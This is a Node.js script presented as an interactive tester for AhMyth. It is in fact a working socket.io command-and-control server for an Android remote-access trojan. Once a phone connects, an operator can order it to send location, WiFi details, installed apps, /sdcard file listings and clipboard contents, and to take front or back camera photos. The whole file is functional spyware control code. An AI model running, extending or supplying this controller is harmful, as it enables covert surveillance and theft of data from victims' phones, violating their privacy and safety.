// Manual interactive test for AhMyth functions
const { Server } = require('socket.io');
const readline = require('readline');

const PORT = 1234;
const server = new Server(PORT, {
    cors: { origin: '*' }
});

let connectedClient = null;
let clientInfo = {};

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

console.log('\n╔══════════════════════════════════════════════════════════════╗');
console.log('║        AhMyth Interactive Function Tester                   ║');
console.log('╚══════════════════════════════════════════════════════════════╝\n');
console.log(`[✓] Server listening on port ${PORT}`);
console.log('[i] Waiting for phone to connect...\n');

server.on('connection', (socket) => {
    connectedClient = socket;
    
    // Parse connection query
    const query = socket.handshake.query || {};
    clientInfo = {
        model: query.model || 'Unknown',
        manufacturer: query.manf || 'Unknown',
        android: query.release || 'Unknown',
        deviceId: query.id || 'Unknown'
    };
    
    console.log('═══════════════════════════════════════════════════════════════');
    console.log('[✓] PHONE CONNECTED!');
    console.log(`    Model: ${clientInfo.model}`);
    console.log(`    Manufacturer: ${clientInfo.manufacturer}`);
    console.log(`    Android: ${clientInfo.android}`);
    console.log(`    Device ID: ${clientInfo.deviceId}`);
    console.log('═══════════════════════════════════════════════════════════════\n');
    
    showMenu();
    
    // Handle responses
    socket.on('x0000di', (data) => {
        console.log('\n[←] Device Info Response:');
        console.log(JSON.stringify(data, null, 2));
        showMenu();
    });
    
    socket.on('x0000lm', (data) => {
        console.log('\n[←] Location Response:');
        console.log(JSON.stringify(data, null, 2));
        showMenu();
    });
    
    socket.on('x0000wf', (data) => {
        console.log('\n[←] WiFi Response:');
        console.log(JSON.stringify(data, null, 2));
        showMenu();
    });
    
    socket.on('x0000fm', (data) => {
        console.log('\n[←] File Manager Response:');
        console.log(`Files: ${data.files ? data.files.length : 0}`);
        if (data.files && data.files.length > 0) {
            data.files.slice(0, 10).forEach(f => {
                console.log(`  - ${f.name} (${f.size} bytes)`);
            });
            if (data.files.length > 10) {
                console.log(`  ... and ${data.files.length - 10} more`);
            }
        }
        showMenu();
    });
    
    socket.on('x0000ap', (data) => {
        console.log('\n[←] Apps List Response:');
        console.log(`Apps: ${data.appsList ? data.appsList.length : 0}`);
        if (data.appsList && data.appsList.length > 0) {
            data.appsList.slice(0, 10).forEach(app => {
                console.log(`  - ${app.appName || app.name} (${app.packageName || app.package})`);
            });
            if (data.appsList.length > 10) {
                console.log(`  ... and ${data.appsList.length - 10} more`);
            }
        }
        showMenu();
    });
    
    socket.on('x0000cb', (data) => {
        console.log('\n[←] Clipboard Response:');
        console.log(JSON.stringify(data, null, 2));
        showMenu();
    });
    
    socket.on('x0000ca', (data) => {
        if (data.error) {
            console.log(`\n[✗] Camera Error: ${data.error}`);
        } else {
            console.log('\n[✓] Camera photo captured');
            console.log(`Size: ${data.data ? data.data.length : 0} bytes`);
        }
        showMenu();
    });
    
    socket.on('x0015', (data) => {
        console.log('\n[←] Permission Request Response:');
        console.log(JSON.stringify(data, null, 2));
        showMenu();
    });
    
    socket.on('disconnect', () => {
        console.log('\n[✗] Phone disconnected!');
        connectedClient = null;
        process.exit(0);
    });
});

function showMenu() {
    console.log('\n╔══════════════════════════════════════════════════════════════╗');
    console.log('║                    Available Commands                        ║');
    console.log('╠══════════════════════════════════════════════════════════════╣');
    console.log('║ 1. Device Info        | 2. Location        | 3. WiFi Info    ║');
    console.log('║ 4. List Apps          | 5. File Manager    | 6. Clipboard    ║');
    console.log('║ 7. Camera (Front)     | 8. Camera (Back)   | 9. Permissions  ║');
    console.log('║ 0. Exit                                                      ║');
    console.log('╚══════════════════════════════════════════════════════════════╝');
    
    rl.question('\nEnter command number: ', (answer) => {
        handleCommand(answer.trim());
    });
}

function handleCommand(cmd) {
    if (!connectedClient) {
        console.log('[✗] No phone connected!');
        showMenu();
        return;
    }
    
    switch(cmd) {
        case '1':
            console.log('[→] Requesting device info...');
            connectedClient.emit('order', { order: 'x0000di' });
            break;
            
        case '2':
            console.log('[→] Requesting location...');
            connectedClient.emit('order', { order: 'x0000lm' });
            break;
            
        case '3':
            console.log('[→] Requesting WiFi info...');
            connectedClient.emit('order', { order: 'x0000wf' });
            break;
            
        case '4':
            console.log('[→] Requesting installed apps...');
            connectedClient.emit('order', { order: 'x0000ap' });
            break;
            
        case '5':
            console.log('[→] Listing root directory...');
            connectedClient.emit('order', { 
                order: 'x0000fm',
                extra: 'ls',
                path: '/sdcard'
            });
            break;
            
        case '6':
            console.log('[→] Getting clipboard...');
            connectedClient.emit('order', { 
                order: 'x0000cb',
                extra: 'get'
            });
            break;
            
        case '7':
            console.log('[→] Taking photo with front camera...');
            connectedClient.emit('order', { 
                order: 'x0000ca',
                extra: '1'
            });
            break;
            
        case '8':
            console.log('[→] Taking photo with back camera...');
            connectedClient.emit('order', { 
                order: 'x0000ca',
                extra: '0'
            });
            break;
            
        case '9':
            console.log('[→] Requesting permissions...');
            connectedClient.emit('order', { order: 'x0015' });
            break;
            
        case '0':
            console.log('\n[✓] Exiting...');
            process.exit(0);
            break;
            
        default:
            console.log('[✗] Invalid command!');
            showMenu();
    }
}

// Handle Ctrl+C
process.on('SIGINT', () => {
    console.log('\n\n[✓] Server stopped');
    process.exit(0);
});
